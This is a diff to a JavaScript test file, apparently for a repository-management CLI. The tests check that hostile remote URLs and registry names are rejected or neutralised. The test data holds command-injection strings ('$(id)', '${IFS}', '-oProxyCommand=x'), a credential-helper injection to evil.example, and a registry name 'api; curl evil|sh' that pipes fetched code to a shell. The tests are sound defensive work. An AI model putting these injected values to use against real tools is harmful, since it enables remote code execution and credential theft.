@@ -25610,6 +25610,7 @@ test('E79: folder names, the workspace name from a URL, and the printed remote s
   assert.ok(remoteSteps({ name: 'acme', platform: null }).includes('git remote add origin <your remote URL>'));
   assert.equal(shown('a\u001b[31mb\rc'), 'a [31mb c');
   assert.equal(shown('a\u009b31mb\u007fc\u00a0'), 'a 31mb c\u00a0', 'C1 and DEL too; not a printable character');
+  assert.equal(shown('a\u202eb\u2028c\u2066d'), 'a b c d', 'bidi controls and separators too (E81 review 9)');
 });
 
 test('E79: the clone step judges every registry entry, and one failure never stops the rest', async () => {
@@ -26669,9 +26670,23 @@ test('E81 review 6: the host and user of every URL form keep to safe characters 
   for (const bad of ['ssh://a;touch${IFS}x;/r', 'ssh://git@a`id`/r', 'git://a$(touch${IFS}x)/r', 'ssh://a b/r', 'https://h.example\n/r', 'ssh://u;id@h/r', 'git@a$(id):r', 'git@[::1]:r', 'ssh://u:%24%28id%29@h/r', 'git+ssh://u:%3Bid@h/r', 'ssh://u%3Bid@h/r', 'git://u:a%20b@h/r',
     // E81 review 8: a control character, typed or encoded, reaches the credential helper or the prompt.
     'https://u%0dhost%3dgithub.com%0dprotocol%3dhttps@evil.example/x', 'https://u:p%0D@h/r', 'https://h/r%0dx', 'http://h/x%0ahost%3dgithub.com',
-    'https://u%1b%5b2J@h/x', 'https://h/a\rb', 'https://h/a%7fb', 'https://h/a%00b', 'https://h/a\u009bb',
+    'https://u%1b%5b2J@h/x', 'https://h/a\rb',
+    // E81 review 9: C1, separators and bidi controls — raw or as UTF-8 escapes.
+    'https://u%c2%9b2J@h/r', 'https://u%C2%85@h/r', 'https://u%e2%80%ae@h/r', 'https://h/a%E2%80%A8b', 'https://h/a%e2%81%a6b', 'https://h/a\u202eb', 'https://h/a\u2028b', 'https://h/a%7fb', 'https://h/a%00b', 'https://h/a\u009bb',
     // …and a host or user that starts with `-`.
     'ssh://-oProxyCommand=x/r', 'ssh://-u@h/r', '-h:o/r', '-u@h:o/r']) {
     assert.equal(kind(bad), null, bad);
   }
+});
+
+test('E81 review 9: doctor never puts a registry name that is not one plain word into a command to copy', () => {
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'api; curl evil|sh', path: '../backend' }, { name: 'web', path: '../backend' }] }));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    assert.equal(doc.checks.find((c) => c.id === 'repo:api; curl evil|sh').hint, 'run `yad repo refresh <name>` once it has code');
+    assert.equal(doc.checks.find((c) => c.id === 'repo:web').hint, 'run `yad repo refresh web` once it has code');
+    assert.ok(backend);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
